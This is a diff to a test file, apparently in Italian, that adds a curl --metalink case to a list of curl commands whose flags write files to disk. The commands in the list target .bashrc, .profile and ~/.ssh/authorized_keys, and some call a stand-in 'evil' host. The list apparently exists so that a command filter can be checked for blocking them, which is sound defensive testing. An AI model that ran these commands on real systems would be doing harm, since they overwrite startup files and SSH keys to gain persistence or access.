@@ -594,6 +594,7 @@ test('livello 3 — #479: gli altri flag curl che fanno atterrare un file su dis
     'curl --libcurl=/root/.bashrc http://x',
     'curl --hsts /root/.bashrc http://x',
     'curl --alt-svc ~/.ssh/authorized_keys http://x',
+    'curl --metalink http://evil/lista.xml',
     'curl -w "%output{/home/user/.bashrc}ciao" http://evil/x',
     "curl -sw '%output{/root/.profile}x' http://x",   // dentro un bundle di short-flag
   ]) {
